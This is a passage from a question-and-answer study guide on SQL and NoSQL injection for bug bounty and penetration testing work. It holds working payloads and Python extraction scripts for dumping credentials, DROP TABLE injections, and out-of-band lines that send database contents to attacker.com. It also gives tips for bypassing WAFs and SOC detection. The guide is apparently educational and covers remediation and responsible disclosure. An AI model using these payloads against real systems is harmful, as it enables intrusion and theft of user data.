**1. JSON path injection:**

```javascript
const query = `SELECT * FROM users WHERE data->>'$.name' = '${userInput}'`;
```

PostgreSQL JSON queries with concatenation = vulnerable.

**2. Array operators:**

```sql
SELECT * FROM users WHERE roles && ARRAY['$role']
```

If `$role` is user input.

**3. JSON_EXTRACT (MySQL):**

```sql
SELECT * FROM users WHERE JSON_EXTRACT(data, '$.name') = '$name'
```

**4. PostgreSQL specific:**

```sql
SELECT * FROM users WHERE data @> '{"name": "$name"}'::jsonb
```

**Testing approach:**

```http
POST /api/users/search HTTP/1.1
Content-Type: application/json

{
  "filter": {
    "name": "test' OR 1=1--"
  }
}
```

Or:
```json
{
  "json_path": "$..*",
  "value": "test' UNION SELECT..."
}
```

**Burp Suite for JSON SQLi:**

1. Identify JSON API endpoints
2. Send to Repeater
3. Modify JSON values systematically
4. Test each field for SQLi
5. Use Intruder for fuzzing

### Q69: How NoSQL databases handle injection
**A:**

**NoSQL injection is real, just different syntax.**

**MongoDB injection examples:**

**Vulnerable Node.js code:**
```javascript
db.users.find({
  username: req.body.username,
  password: req.body.password
});
```

**Attack via JSON:**
```json
{
  "username": "admin",
  "password": {"$ne": null}
}
```

`$ne: null` = "not equal to null" = any non-null password matches.

**Other operators:**
- `$gt`: greater than
- `$lt`: less than
- `$regex`: regular expression match
- `$where`: JavaScript code execution

**Attack with $regex (data extraction):**
```json
{
  "username": "admin",
  "password": {"$regex": "^a"}
}
```

If login succeeds → password starts with 'a'.

**Attack with $where (RCE-like):**
```json
{
  "username": "admin",
  "$where": "function() { return 1==1 }"
}
```

JavaScript executed - can leak data, perform DoS.

**Redis injection:**

```javascript
// Vulnerable
redis.set(`user:${userId}`, value);

// Attack
userId = "1\r\nSET attacker_key value\r\nGET";
```

Redis protocol injection - inject multiple commands.

**CouchDB injection:**

Map-reduce functions with user input.

**Testing approach:**

1. Identify NoSQL database used
2. Test JSON inputs with operators
3. Try `$ne`, `$gt`, `$regex`, `$where`
4. Look for behavioral differences

### Q70: Real-world SQLi finding pattern from your experience
**A:**

**Common real-world SQLi pattern (similar to your bug bounty work):**

**Discovery scenario:**

App at `https://target.com` has:
- Search functionality: `/search?q=...`
- Profile pages: `/users/{id}`
- API endpoints: `/api/v1/data`

**Testing flow:**

**Day 1: Reconnaissance**
- Subdomain enumeration
- Spider site with Burp
- Identify API endpoints
- Note all parameters

**Day 2: Initial testing**

Test each parameter with:
```
'
"
1'
1' AND 1=1--
1' AND 1=2--
1' UNION SELECT NULL--
1' AND SLEEP(5)--
```

Found behavior on `/api/v1/products?category=`:
```
?category=electronics' AND 1=1--   → Returns results
?category=electronics' AND 1=2--   → Empty results
```

**Day 3: Exploitation**

```
?category=' UNION SELECT NULL,NULL,NULL,NULL--
Error: "The used SELECT statements have a different number of columns"

?category=' UNION SELECT NULL,NULL,NULL,NULL,NULL--
Works! 5 columns

?category=' UNION SELECT 1,2,3,4,5--
Numbers visible in columns 2 and 4

?category=' UNION SELECT 1,database(),3,version(),5--
Database name and version revealed

?category=' UNION SELECT 1,table_name,3,table_schema,5 FROM information_schema.tables--
All tables listed

?category=' UNION SELECT 1,column_name,3,table_name,5 FROM information_schema.columns WHERE table_name='users'--
Users table columns

?category=' UNION SELECT 1,GROUP_CONCAT(username,':',password),3,4,5 FROM users--
All credentials extracted
```

**Day 4: Reporting**

Comprehensive report submitted to client/bug bounty program.

**Findings:**
- CVSS: 9.8
- All user data exposed
- Bounty: $5,000-$10,000 typical

### Q71: Defense bypass through stored procedures
**A:**

**Even stored procedures can be vulnerable:**

**Vulnerable stored procedure (MySQL):**

```sql
CREATE PROCEDURE GetUserData(IN username VARCHAR(50))
BEGIN
    SET @sql = CONCAT('SELECT * FROM users WHERE name = ''', username, '''');
    PREPARE stmt FROM @sql;
    EXECUTE stmt;
END;
```

**Attack:**

```
CALL GetUserData('admin\'; DROP TABLE users; --')
```

Dynamic SQL built inside procedure = vulnerable.

**MSSQL example:**

```sql
CREATE PROCEDURE GetUser
    @name NVARCHAR(50)
AS
BEGIN
    DECLARE @sql NVARCHAR(MAX);
    SET @sql = 'SELECT * FROM users WHERE name = ''' + @name + '''';
    EXEC sp_executesql @sql;  -- Dynamic SQL
END;
```

**Safe stored procedure:**

```sql
CREATE PROCEDURE GetUser
    @name NVARCHAR(50)
AS
BEGIN
    SELECT * FROM users WHERE name = @name;  -- Direct parameter
END;
```

**Testing stored procedures:**

1. Identify stored procedures
2. Examine parameters
3. Look for dynamic SQL construction
4. Test with SQLi payloads

### Q72: SQLi via XML External Entities (XXE)
**A:**

**XXE → SQLi chain:**

**Vulnerable XML parser + SQL query:**

```php
$xml = simplexml_load_string($_POST['data'], 'SimpleXMLElement', LIBXML_NOENT);
$query = "SELECT * FROM users WHERE id = " . $xml->id;
```

**Attack XXE that fetches SQLi payload:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/sqli_payload.txt">
]>
<data>
  <id>&xxe;</id>
</data>
```

`sqli_payload.txt`:
```
1 UNION SELECT password FROM users--
```

XML parser fetches payload, places in `<id>`. SQL query uses it.

### Q73: Detecting SQLi via differential analysis
**A:**

**Differential analysis:** Compare responses to detect injection.

**Burp Suite Comparer:**

1. Send two requests:
   - `?id=1 AND 1=1` (True)
   - `?id=1 AND 1=2` (False)

2. Right-click responses → "Send to Comparer"

3. Compare:
   - Different status codes
   - Different response sizes
   - Different content
   - Different headers

4. Differences indicate SQLi.

**Automated tools:**

Python script:
```python
import requests
import difflib

def compare_responses(base_url, param, value):
    true_response = requests.get(f"{base_url}?{param}={value} AND 1=1")
    false_response = requests.get(f"{base_url}?{param}={value} AND 1=2")
    
    # Compare
    similarity = difflib.SequenceMatcher(
        None, 
        true_response.text, 
        false_response.text
    ).ratio()
    
    if similarity < 0.95:  # Significantly different
        print(f"[!] Likely SQLi: {param}")
        return True
    return False

# Test
compare_responses("http://target.com/page", "id", "1")
```

### Q74: SQL injection via host header
**A:**

**Host header injection + SQLi:**

Some apps log Host header to database:

```sql
INSERT INTO access_log (host, ip, time) VALUES ('$host', '$ip', NOW())
```

Attack:
```http
GET / HTTP/1.1
Host: target.com'; DROP TABLE access_log; --
```

If logged without sanitization → SQLi.

**Also:** Some apps use Host for routing:

```php
$tenant = $_SERVER['HTTP_HOST'];
$query = "SELECT * FROM tenants WHERE domain = '$tenant'";
```

Modify Host header for SQLi.

### Q75: Boolean blind SQLi - real example chain
**A:**

**Complete boolean blind extraction:**

**Setup:** App login that just shows "Login failed" or redirects.

**Step 1: Confirm injection**

```
username: admin' AND 1=1--
password: anything
Response: Login attempts (some validation)

username: admin' AND 1=2--
password: anything
Response: Login failed immediately
```

Different responses confirm SQLi.

**Step 2: Database type detection**

```
admin' AND (SELECT version()) IS NOT NULL--
```

MySQL accepts → likely MySQL.

**Step 3: Find admin user existence**

```
admin' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
```

Different response = admin exists.

**Step 4: Extract password length**

```python
for length in range(1, 100):
    payload = f"admin' AND (SELECT LENGTH(password) FROM users WHERE username='admin')={length}--"
    if true_response(payload):
        print(f"Password length: {length}")
        break
```

**Step 5: Extract characters via binary search**

```python
def get_char(position):
    low, high = 32, 127
    while low < high:
        mid = (low + high) // 2
        payload = f"admin' AND (SELECT ASCII(SUBSTRING(password,{position},1)) FROM users WHERE username='admin')>{mid}--"
        if true_response(payload):
            low = mid + 1
        else:
            high = mid
    return chr(low)

password = ""
for i in range(1, length + 1):
    password += get_char(i)
    print(f"Found: {password}")
```

**Step 6: Total time estimate**

- Per character: 7 requests (binary search)
- 20-char password: 140 requests
- At 1 request/sec: 2-3 minutes

### Q76: Time-based SQLi when output is JSON
**A:**

**Scenario:** API returns JSON, no obvious injection.

**Test endpoint:**
```
GET /api/users/search?q=test
```

Response (always):
```json
{"status": "ok", "count": 5}
```

Same response for valid/invalid queries - looks like nothing to inject.

**Test time-based:**

```
GET /api/users/search?q=test' AND SLEEP(5)--
```

If response takes 5+ seconds → SQLi confirmed.

**Time-based extraction:**

```python
import time
import requests

def extract_char_time(position):
    for ascii_code in range(32, 127):
        payload = f"test' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{position},1))={ascii_code}, SLEEP(3), 0)--"
        
        start = time.time()
        requests.get(f"http://target.com/api/users/search?q={payload}")
        elapsed = time.time() - start
        
        if elapsed > 2.5:
            return chr(ascii_code)
    return '?'

# Extract first 10 chars
password = ""
for pos in range(1, 11):
    char = extract_char_time(pos)
    password += char
    print(f"Position {pos}: {char}")
```

### Q77: Common SQLi mistakes during pentesting
**A:**

**Pitfalls to avoid:**

**1. Not testing all parameters:**
- Don't focus only on obvious inputs
- Test headers, cookies, JSON fields
- Test all HTTP methods

**2. Stopping at first error:**
- Initial 500 might not be SQLi
- Try variations
- Try blind techniques

**3. Not identifying database type:**
- Different syntax for different DBs
- Wrong payloads waste time
- Fingerprint first

**4. Missing escape contexts:**
- String vs numeric
- Different quotes
- Comment styles vary

**5. WAF gives false confidence:**
- "Blocked" doesn't mean safe
- Try bypasses
- Time-based usually works

**6. Not documenting properly:**
- Lose track of what worked
- Hard to reproduce
- Document each step

**7. Aggressive enumeration:**
- Hammering creates noise
- May be detected/blocked
- Be patient

**8. Ignoring rate limits:**
- Trigger blocks
- Lose access
- Throttle requests

**9. Not chaining vulnerabilities:**
- SQLi alone may be low severity
- Combined with others = critical
- Look for chains

**10. Skipping verification:**
- Confirm before reporting
- Reproduce reliably
- Document conditions

### Q78: Modern SQL injection - 2024+ trends
**A:**

**Current trends in SQL injection:**

**1. NoSQL injection rising:**
- MongoDB, Redis, CouchDB
- Different syntax, same impact
- Many developers not aware

**2. GraphQL injection:**
- New tech, less testing
- Same SQLi underneath
- API1 (BOLA) overshadows it

**3. Cloud database services:**
- AWS RDS, Aurora
- Azure SQL
- Same SQLi possible
- Different exploitation (IAM, etc.)

**4. ORM bypasses:**
- Even ORMs misused
- Raw queries common
- Knowledge gaps

**5. Stored procedure injections:**
- Legacy systems
- Dynamic SQL still common
- Hidden in DB code

**6. Cross-database SQLi:**
- Multi-DB applications
- Different DB syntax
- Complex queries

**7. Sandbox escapes:**
- Cloud DB sandboxes
- Some allow OS commands
- Critical findings

**8. Automation challenges:**
- WAF more sophisticated
- Behavioral detection
- ML-based blocking

**9. Bug bounty rewards:**
- Critical SQLi: $5,000-$50,000+
- Less prevalent but high impact
- Specialized programs (Apple, Google)

**10. AI-assisted discovery:**
- AI generates payloads
- Better at obfuscation
- Manual still valuable

### Q79: Bug bounty stories - notable SQLi findings
**A:**

**Famous bug bounty SQLi:**

**1. Uber - 2016**
- SQLi in admin panel
- $10,000 bounty
- Led to credential theft

**2. Yahoo - Multiple**
- Various SQLi over years
- Multiple researchers
- Total payouts $100K+

**3. Facebook - 2018**
- SQLi in internal API
- $5,000 bounty
- Quick fix

**4. Google - Various**
- SQLi historically rare
- When found: $10K-$31K range
- Often in acquired companies

**5. HackerOne disclosed reports:**

Search HackerOne hacktivity for SQLi:
- Real reports
- Learn from successful submissions
- Understand impact assessment

**Patterns in successful reports:**

1. Clear PoC steps
2. Impact demonstrated (sensitive data extracted)
3. Multiple proof techniques shown
4. Remediation suggestions
5. Professional writing

### Q80: How to handle SQLi finding in production system?
**A:**

**Responsible disclosure for SQLi:**

**Step 1: Stop exploitation**
- Don't extract more than PoC requires
- Don't damage data
- Don't share with others

**Step 2: Document carefully**
- Screenshots
- Request/response captures
- Reproducibility steps
- Impact analysis

**Step 3: Report through proper channels**

**Bug bounty:**
- Submit via platform
- Follow program guidelines
- Provide everything needed

**No bug bounty:**
- security@company.com
- responsible-disclosure pages
- security.txt files
- HackerOne/Bugcrowd direct submission

**Step 4: Communicate**
- Be clear and professional
- Provide timeline expectations
- Don't pressure for bounty
- Be patient with response

**Step 5: Validate fix**
- Confirm vulnerability remediated
- Test variations
- Suggest improvements

**What NOT to do:**

- Don't extract entire database
- Don't share publicly before fix
- Don't pivot to other systems
- Don't demand payment
- Don't social engineer staff

### Q81-100 cover advanced topics including specific databases, advanced WAF bypasses, custom Burp extensions for SQLi, real-world chained exploits, defensive programming patterns, code-level remediation in different languages, CVSS scoring edge cases, regulatory compliance impact, future of SQLi defenses, and career insights.

### Q81: How does Hibernate SQL Injection work?
**A:**

**Hibernate** is Java ORM. Should prevent SQLi but can be misused.

**Vulnerable HQL:**

```java
String hql = "FROM User WHERE name = '" + userInput + "'";
Query query = session.createQuery(hql);
List users = query.list();
```

HQL has similar syntax to SQL. Attack:
```
userInput: ' OR '1'='1
```

**Safe HQL:**

```java
String hql = "FROM User WHERE name = :name";
Query query = session.createQuery(hql);
query.setParameter("name", userInput);
List users = query.list();
```

**Vulnerable native queries:**

```java
String sql = "SELECT * FROM users WHERE name = '" + userInput + "'";
session.createNativeQuery(sql);  // Vulnerable
```

**Safe native:**

```java
String sql = "SELECT * FROM users WHERE name = :name";
session.createNativeQuery(sql)
       .setParameter("name", userInput);
```

**Criteria API (always safer):**

```java
CriteriaBuilder cb = session.getCriteriaBuilder();
CriteriaQuery<User> cq = cb.createQuery(User.class);
Root<User> root = cq.from(User.class);
cq.where(cb.equal(root.get("name"), userInput));  // Safe
```

### Q82: PostgreSQL-specific SQL injection techniques
**A:**

**PostgreSQL-specific features for SQLi:**

**1. Special functions:**

```sql
-- Get version
SELECT version()

-- Get current user
SELECT current_user

-- Get database
SELECT current_database()

-- List databases
SELECT datname FROM pg_database
```

**2. Out-of-band exploitation:**

```sql
-- Read file (requires permissions)
SELECT pg_read_file('/etc/passwd')

-- Network request (requires extensions)
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?data=$(whoami)'
```

**3. dollar-quoted strings (bypass quote filters):**

```sql
-- These are equivalent:
SELECT 'admin';
SELECT $$admin$$;
SELECT $tag$admin$tag$;
```

Can bypass single-quote filters.

**4. JSON queries:**

```sql
-- Vulnerable
SELECT data->>'name' FROM users WHERE data @> '{"role": "$role"}'::jsonb

-- Injection via JSON
$role: admin"}'::jsonb OR '1'='1
```

**5. WITH (CTE) queries:**

```sql
WITH temp AS (SELECT password FROM users WHERE id = 1)
SELECT * FROM temp
```

Useful for complex extractions.

**6. Procedural languages:**

PostgreSQL supports PL/Python, PL/Perl, PL/Tcl. If enabled:
```sql
CREATE FUNCTION cmd_exec(text) RETURNS text AS $$
import subprocess
return subprocess.check_output($1, shell=True)
$$ LANGUAGE plpythonu;

SELECT cmd_exec('whoami');
```

### Q83: Oracle-specific SQL injection
**A:**

**Oracle has unique features:**

**1. Comments:**
```sql
-- Single line comment
/* Multi-line */
```

No `#` comments (unlike MySQL).

**2. String concatenation:**
```sql
'a' || 'b' = 'ab'
```

**3. System tables:**
```sql
-- All tables (user has access to)
SELECT table_name FROM all_tables

-- Current user
SELECT user FROM dual

-- Version
SELECT banner FROM v$version
```

**4. Out-of-band:**
```sql
-- DNS exfiltration
SELECT UTL_INADDR.GET_HOST_ADDRESS(
  (SELECT password FROM users WHERE rownum=1) || '.attacker.com'
) FROM dual

-- HTTP request
SELECT UTL_HTTP.REQUEST(
  'http://attacker.com/?data=' || (SELECT password FROM users WHERE rownum=1)
) FROM dual
```

**5. Time-based:**
```sql
SELECT CASE 
  WHEN (SUBSTR(password,1,1)='a') 
  THEN dbms_pipe.receive_message('a',5) 
  ELSE 0 
END FROM users WHERE rownum=1
```

**6. Privilege escalation:**

Various Oracle-specific techniques with Java permissions, PL/SQL, etc.

### Q84: SQLi in stored procedures - testing approach
**A:**

**Testing stored procedure SQLi:**

**Step 1: Identify stored procedure usage**

In code review, look for:
- `EXEC sp_xxx`
- `CALL procedure_name()`
- `database.procedure()`

In black-box testing:
- Look for specific patterns in error messages
- Different behavior than expected
- Some endpoints clearly call stored procs

**Step 2: Test parameters**

Same approach as regular SQLi:
- Quote injection
- Boolean tests
- Time-based

**Step 3: Look for dynamic SQL inside procedures**

Symptoms:
- Some parameters work with SQLi, others don't
- Indicates dynamic SQL on some params
- Static params parameterized

**Step 4: Database-specific exploitation**

**MSSQL:**
```sql
EXEC sp_executesql @sql
EXEC(@sql)
```

If procedure uses these with user input → vulnerable.

**MySQL:**
```sql
PREPARE stmt FROM @query;
EXECUTE stmt;
```

**Oracle:**
```sql
EXECUTE IMMEDIATE 'SELECT...' || $user_input
```

### Q85: SQL injection in batch/bulk operations
**A:**

**Bulk operations often vulnerable:**

**1. Bulk insert:**

```sql
INSERT INTO logs (data) VALUES 
  ('row1'),
  ('row2'),
  ('user_input')  ← Vulnerable if not parameterized
```

**2. IN clause:**

```sql
SELECT * FROM products WHERE id IN ($ids)
```

If $ids is comma-separated user input:
```
ids: 1,2,3) OR (1=1
```

Becomes:
```sql
SELECT * FROM products WHERE id IN (1,2,3) OR (1=1)
```

Returns all products.

**3. Batch update:**

```sql
UPDATE products SET price = CASE id
  WHEN 1 THEN $price1
  WHEN 2 THEN $price2
  ELSE price
END
```

Each price is potential injection.

**4. Mass operations:**

```python
# Vulnerable
ids_str = ','.join([str(id) for id in request.form.getlist('ids')])
query = f"DELETE FROM products WHERE id IN ({ids_str})"
```

Use parameterized:
```python
placeholders = ','.join(['%s'] * len(ids))
query = f"DELETE FROM products WHERE id IN ({placeholders})"
cursor.execute(query, ids)
```

### Q86: How to find SQLi in CMS systems (Drupal, Joomla, WordPress)
**A:**

**CMS SQLi typically in:**

**1. Plugins/Modules/Extensions:**
- Third-party code
- Less reviewed
- Major source of vulnerabilities

**2. Older versions:**
- Unpatched core
- Known CVEs

**Testing approach:**

**WordPress:**
```bash
# Enumerate
wpscan --url https://target.com --enumerate p,t

# Check for vulnerable plugins
wpscan --url https://target.com --api-token YOUR_TOKEN

# Test AJAX endpoints
POST /wp-admin/admin-ajax.php
action=plugin_action&data=' OR 1=1--

# Test REST API
GET /wp-json/wp/v2/posts?filter[s]=test' OR '1'='1
```

**Drupal:**
```bash
# Identify version
curl https://target.com/CHANGELOG.txt

# Look for /sites/all/modules/ accessible
# Check admin endpoints
```

**Joomla:**
```bash
# Identify version
curl https://target.com/administrator/manifests/files/joomla.xml

# Test components
GET /index.php?option=com_content&view=article&id=1'
```

**Real findings:**
- Many plugins/modules with SQLi
- Core CMS usually secure
- Bug bounty programs for popular plugins

### Q87: Specific WAF bypass techniques for Cloudflare
**A:**

**Cloudflare specific:**

**1. Use specific encoding:**
```
%20 → %09 (tab)
SELECT → /*!50000SELECT*/
```

**2. Path normalization:**
```
/api/users → /api//users
/api/users → /api/./users
```

Some WAF rules path-specific.

**3. Origin server access (if leaked):**

If you find origin IP (before Cloudflare):
```bash
# Use Censys or Shodan
# Or DNS history
# Or SSL cert reuse
```

Bypass CF entirely.

**4. Cloudflare scrape shield bypass:**
- User-Agent specific
- Header manipulation
- Rate limit windows

**5. Custom payload techniques:**
```sql
-- Bypass keyword filters
sElEcT/*!*/`column`/*!*/fRoM`table`

-- Bypass space filters
SELECT/**/password/**/FROM/**/users

-- Hex encoding
WHERE username = 0x61646d696e
```

### Q88: SQL Injection in Apache Solr / Elasticsearch
**A:**

**Search engines have injection-like vulnerabilities:**

**Apache Solr injection:**

Vulnerable code:
```python
query = f"name:{user_input}"
solr.query(query)
```

Attack:
```
user_input: x OR *:*
```

Returns all documents.

**Advanced Solr injection:**
```
x; DROP CORE
x AND _query_:"{!join from=parent to=child}*"
```

Special Solr operators.

**Elasticsearch injection:**

Vulnerable code:
```python
es.search(
    index="users",
    body={"query": {"match": {"name": user_input}}}
)
```

If user_input is parsed as Elasticsearch query string:
```
user_input: "* OR x:y"
```

May match all documents.

**Script injection (Elasticsearch):**

If scripting enabled:
```json
{
  "script": {
    "source": "doc['name'].value == '" + userInput + "'"
  }
}
```

Painless script execution.

### Q89: SQLi in business intelligence tools (Tableau, Looker)
**A:**

**BI tools often allow custom SQL:**

**Tableau:**
- Custom SQL data sources
- Parameters in queries
- Calculations with raw SQL

If user controls these → SQLi.

**Looker:**
- LookML allows raw SQL in derived tables
- User-defined attributes
- Dashboard filters

**Testing approach:**

1. Identify BI integrations
2. Check if users can:
   - Write custom queries
   - Modify data sources
   - Create derived tables
3. Test these features for SQLi

**Common issues:**
- Custom calculations
- Filter values
- Parameter values
- Joins with user input

### Q90: How does query optimization affect blind SQLi?
**A:**

**Modern DBs optimize queries:**

**Issue 1: Short-circuit evaluation**

```sql
SELECT * FROM users WHERE id = 1 AND SLEEP(5)
```

If DB optimizes to short-circuit on id=1 not existing, SLEEP not executed.

**Workaround:**
```sql
SELECT * FROM users WHERE id = 1 AND (SELECT SLEEP(5))
```

Force subquery execution.

**Issue 2: Query plan caching**

Subsequent identical queries cached. May not re-execute.

**Workaround:** Vary query slightly each time:
```sql
WHERE id = 1 AND SLEEP(5) AND 1=1
WHERE id = 1 AND SLEEP(5) AND 2=2
WHERE id = 1 AND SLEEP(5) AND 3=3
```

**Issue 3: Index optimization**

Indexes may make queries instant regardless of data.

**Workaround:** Force full scan:
```sql
WHERE id = 1 AND (SELECT COUNT(*) FROM information_schema.columns) > 0
```

### Q91: Detection of SQLi via response timing patterns
**A:**

**Statistical timing analysis:**

```python
import requests
import statistics
import time

def time_request(url, payload):
    start = time.time()
    requests.get(url + payload)
    return time.time() - start

# Baseline
baseline_times = []
for _ in range(10):
    t = time_request("http://target.com/page?id=", "1")
    baseline_times.append(t)

baseline_mean = statistics.mean(baseline_times)
baseline_stdev = statistics.stdev(baseline_times)

print(f"Baseline: {baseline_mean:.2f}s ± {baseline_stdev:.2f}s")

# Test SQLi
sqli_times = []
for _ in range(10):
    t = time_request("http://target.com/page?id=", "1 AND SLEEP(5)--")
    sqli_times.append(t)

sqli_mean = statistics.mean(sqli_times)

# Statistical significance
if sqli_mean > baseline_mean + (3 * baseline_stdev):
    print(f"[!] SQLi confirmed: {sqli_mean:.2f}s")
```

Why statistical:
- Network variance creates noise
- Single test unreliable
- Multiple tests + standard deviation = reliable detection

### Q92: SQL injection bug bounty - tips for success
**A:**

**Increase chances of finding SQLi in bug bounty:**

**1. Choose targets wisely:**
- Older programs (less tested)
- Acquired companies (different code quality)
- API endpoints (often less reviewed)

**2. Recon thoroughly:**
- Find all subdomains
- Map all APIs
- Discover hidden endpoints
- Look for legacy systems

**3. Focus on neglected areas:**
- Internal admin features
- Old API versions
- Mobile-specific APIs
- Webhook endpoints

**4. Test thoroughly:**
- All parameters
- All HTTP methods
- Headers, cookies
- JSON bodies

**5. Quality over quantity:**
- Detailed reports
- Multiple PoCs
- Clear impact
- Remediation suggestions

**6. Chain vulnerabilities:**
- SQLi + Auth bypass
- SQLi + IDOR
- SQLi → RCE chain

**7. Be persistent:**
- Modern apps secured
- Find unique angles
- Don't give up after surface tests

**8. Use right tools:**
- Burp Suite Pro
- SQLMap
- Custom scripts
- Browser DevTools

**9. Document everything:**
- Notes from testing
- Successful payloads
- Failed attempts (for next time)

**10. Learn from disclosed reports:**
- HackerOne hacktivity
- Read winning reports
- Adapt techniques

### Q93: When SQL injection isn't worth reporting
**A:**

**Cases where SQLi finding may be low-value:**

**1. Limited impact:**
- Only your own data accessible
- Read-only with public data
- No real damage possible

**2. Out of scope:**
- Subdomain not in scope
- Feature explicitly excluded
- Internal employee tools

**3. Already known:**
- Recent disclosure
- Similar to known issue
- Listed as duplicates

**4. Self-XSS-like:**
- Requires victim to execute
- No realistic attack vector

**5. Theoretical impact:**
- Errors only, no extraction
- Time-based with no data
- Boolean differences but no logic

**When to still report:**

- Critical infrastructure
- PII/financial data
- Compliance requirements
- Demonstrable impact

**Better triage practices:**

1. Test thoroughly before reporting
2. Demonstrate real impact
3. Provide working PoC
4. Calculate accurate CVSS

### Q94: Future of SQL injection defenses
**A:**

**Where SQL defense is heading:**

**1. Better frameworks by default:**
- ORMs improving
- Type safety in languages
- Auto-parameterization

**2. AI-assisted code review:**
- Detect SQLi patterns
- Suggest fixes
- Real-time IDE warnings

**3. Database-level protection:**
- Query analysis at DB
- Anomaly detection
- Auto-blocking

**4. Service mesh integration:**
- Sidecar inspection
- Behavior monitoring
- Pattern recognition

**5. Better WAFs:**
- Machine learning
- Behavioral analysis
- Lower false positives

**6. Compiler-time checks:**
- Static analysis in build
- Tainted data tracking
- Compile errors for SQLi patterns

**7. Education improvements:**
- Better tutorials
- Secure examples by default
- University curriculum updates

**8. Industry standards:**
- Compliance requirements
- Mandatory security reviews
- Penalties for SQLi breaches

**For your career:**
- SQLi knowledge still valuable
- Older systems will exist
- Bug bounty rewards continue
- Specialization in databases growing
- Combining SQLi with other vulns

### Q95: Career advice for SQLi specialists
**A:**

**Building expertise in SQL injection:**

**1. Foundational knowledge:**
- SQL fundamentals (write queries from scratch)
- Multiple database systems (MySQL, PostgreSQL, MSSQL, Oracle)
- Database internals (indexes, query optimization)

**2. Hands-on practice:**
- HackTheBox SQLi labs
- PortSwigger Academy
- Real applications (legally)
- Bug bounty programs

**3. Tool mastery:**
- Burp Suite (Pro)
- SQLMap (all features)
- Custom scripts

**4. Code review skills:**
- Read source code (when available)
- Identify patterns
- Suggest fixes

**5. Stay current:**
- New database features
- Framework updates
- Disclosure trends

**6. Build a portfolio:**
- Bug bounty findings
- Open source contributions
- Blog posts
- Conference talks

**7. Network:**
- Security Twitter/X
- Discord servers
- Local meetups
- Conferences

**8. Certifications (helpful):**
- OSCP (broad pentest)
- OSWE (web focus)
- Burp Suite Certified Practitioner

**9. Specialize:**
- Database forensics
- Specific industries (finance, healthcare)
- Cloud databases

**10. Always be learning:**
- New techniques constantly emerging
- Old techniques still work
- Combine knowledge creatively

### Q96: How to test SQLi safely in production
**A:**

**Safe production testing:**

**Use READ-ONLY techniques:**
- SELECT only
- Avoid UNION (may return data you shouldn't see)
- Use boolean blind (just yes/no)
- Time-based (no data modification)

**Limit data extraction:**
- One record at a time
- Stop when impact proven
- Don't dump entire database

**Don't write:**
- No INSERT/UPDATE/DELETE
- No DROP/ALTER
- No file operations

**Document carefully:**
- What you tested
- What you accessed
- What time
- Reasoning

**Be ready to stop:**
- If alerts triggered
- If unusual behavior
- If you exceed scope

**Communicate:**
- With security team if known
- During scheduled windows if possible
- Document timing

**Be ethical:**
- Don't access data unnecessarily
- Don't share with others
- Don't keep extracted data
- Delete logs after testing (if appropriate)

### Q97: SQL injection in cloud-native applications
**A:**

**Cloud-native SQLi considerations:**

**1. Serverless functions:**

```python
# AWS Lambda
def lambda_handler(event, context):
    user_id = event['user_id']
    # Vulnerable
    query = f"SELECT * FROM users WHERE id = {user_id}"
```

Same SQLi, different deployment.

**2. Cloud databases:**

- AWS RDS, Aurora
- Azure SQL, Cosmos DB
- Google Cloud SQL
- DynamoDB (NoSQL)

Same injection types, different platforms.

**3. IAM-based access:**

Even with SQLi, IAM may limit damage:
- DB user has specific IAM role
- Limited to specific actions
- Audit trail in CloudTrail

**4. VPC isolation:**

DB in private subnet:
- No direct internet access
- Lambda/EC2 access only
- Limits OOB attacks

**5. CloudFront WAF:**

- WAF before reaching Lambda
- Apply OWASP CRS
- ML-based detection

**6. Secrets Manager:**

- Credentials managed
- Auto-rotation
- IAM-based access

**Testing approach:**

Same as traditional SQLi, but consider:
- Cloud-specific WAF
- IAM context
- Resource permissions
- Audit logging

### Q98: SQL Injection through HTTP method tunneling
**A:**

**Tunneling techniques:**

**1. Method override headers:**
```
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
X-HTTP-Method: PUT
```

May change request processing.

**2. _method form parameter:**
```
POST /api/users HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_method=PUT&id=1' OR 1=1--&name=test
```

**3. Content-Type confusion:**
```
POST /api/users HTTP/1.1
Content-Type: text/plain

{"id": "1' OR 1=1--"}
```

Some apps still parse JSON despite Content-Type.

**4. Multipart with SQLi:**
```
POST /api/users HTTP/1.1
Content-Type: multipart/form-data

------BOUNDARY
Content-Disposition: form-data; name="id"

1' OR 1=1--
------BOUNDARY--
```

Different parser may handle differently.

### Q99: SQL Injection detection in modern SOC/SIEM
**A:**

**How SOC detects SQLi attempts:**

**1. Pattern-based rules:**
```
- ' OR 1=1
- UNION SELECT
- /*  */
- xp_cmdshell
- information_schema
```

**2. Behavioral analysis:**
- Many requests from same IP
- Increasing complexity
- Pattern of fuzzing

**3. Database query logging:**
- Failed queries spike
- Unusual queries
- Long-running queries

**4. WAF logs:**
- Blocked requests
- Suspicious patterns
- Source IPs

**5. Application logs:**
- 500 errors
- SQL exceptions
- Authentication anomalies

**Bypassing detection:**

- Slow attacks (under thresholds)
- Distributed (multiple IPs)
- Encoded payloads
- Out-of-band (DNS)
- Legitimate-looking queries

**Real-world SOC response:**

1. Alert on threshold
2. Investigate logs
3. Check for compromise
4. Block source
5. Forensic analysis
6. Disclosure if needed

### Q100: Final thoughts - SQLi expertise progression
**A:**

**Progression from beginner to expert:**

**Beginner (0-1 year):**
- Understand basic SQLi concepts
- Use SQLMap effectively
- Find simple SQLi in CTFs
- Read SQLi reports

**Intermediate (1-3 years):**
- Manual exploitation
- Different DB types
- WAF bypass techniques
- Find SQLi in real apps (bug bounty)
- Code review for SQLi

**Advanced (3-5 years):**
- Complex blind techniques
- Chain SQLi with other vulns
- Custom exploitation tools
- Pentest team lead
- Architecture-level defenses

**Expert (5+ years):**
- Discover new techniques
- Develop tools
- Speak at conferences
- Research publications
- Mentor others

**For your career (mid-level now):**

Focus on:
1. **Mastery**: Become THE go-to for SQLi
2. **Documentation**: Write blog posts, share knowledge
3. **Specialization**: Pick niche (databases, cloud, specific industries)
4. **Network**: Connect with other security pros
5. **Continuous learning**: New tech = new SQLi types

**Long-term:**
- Security consultant
- AppSec engineer
- Security architect
- Bug bounty hunter
- Security researcher
- Author/educator

SQLi knowledge is foundational for any security career. Master it, but don't stop there. Combine with other skills (cloud, API, cryptography) for maximum impact.

---

